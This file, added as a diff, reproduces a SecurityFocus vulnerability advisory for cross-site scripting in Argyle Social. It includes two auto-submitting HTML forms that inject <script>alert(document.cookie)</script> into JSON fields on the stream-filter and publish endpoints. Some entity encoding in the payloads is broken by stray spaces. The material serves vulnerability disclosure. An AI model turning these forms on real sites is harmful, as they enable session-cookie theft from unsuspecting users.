@@ -1,0 +1,21 @@
+source: http://www.securityfocus.com/bid/47826/info
+
+Argyle Social is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks. 
+
+1.
+<form action="www.example.com/settings-ajax/stream_filter_rules/create" method="post" name="main">
+<input type="hidden" name="stream_filter_rule" value=&#039;{"name":"rulename","id":"","flags":[ "flagged"],"networks":null,"user_id":"0","terms":"XSS\& quot;><script>alert(document.cookie)</script>"}&#039;>
+</form>
+<script>
+document.main.submit();
+</script>
+
+2.
+<form action="www.example.com/publish-ajax/efforts/create" method="post" name="main">
+<input type="hidden" name="effort" value=&#039;{"effort_id":"","title":"ptitle2\">< font color="#0000FF"><script>alert(document.cookie)</script>","url":"http://www.google.com","short&q uot;:null,"campaigns":[],"primary_campaign":null,"flights":[{"glass_id" ;:"post0","flight_id":null,"mdk":false,"source":"web interface","content_type":"twitter-status","content":{"content":& quot;hello"},"stime":"4/30/2011 23:10:00","networks":[{"id":"1","name":"My Name","type":"twitter","url":"","avatar":"http://a 2.twimg.com/profile_images/1124040897/at-twitter_reasonably_small.png"}],"waparams":{"pnam e":null}}]}&#039;>
+</form>
+<script>
+document.main.submit();
+</script>
